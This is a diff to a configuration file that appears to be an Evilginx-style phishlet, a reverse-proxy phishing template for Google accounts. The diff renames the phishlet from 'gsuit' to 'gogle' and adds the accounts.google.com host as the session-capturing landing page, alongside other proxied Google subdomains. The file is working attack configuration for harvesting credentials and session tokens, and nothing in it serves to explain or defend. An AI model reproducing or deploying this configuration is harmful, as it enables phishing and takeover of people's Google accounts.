@@ -1,4 +1,4 @@
-name: 'gsuit'
+name: 'gogle'
 author: '@Fulkinprov'
 min_ver: '2.3.0'
 proxy_hosts:
@@ -13,6 +13,7 @@ proxy_hosts:
   - {phish_sub: 'analytics', orig_sub: 'ssl', domain: 'google-analytics.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'workspace', orig_sub: 'workspace', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com:443', session: true, is_landing: true, auto_filter: false}
   
   
   
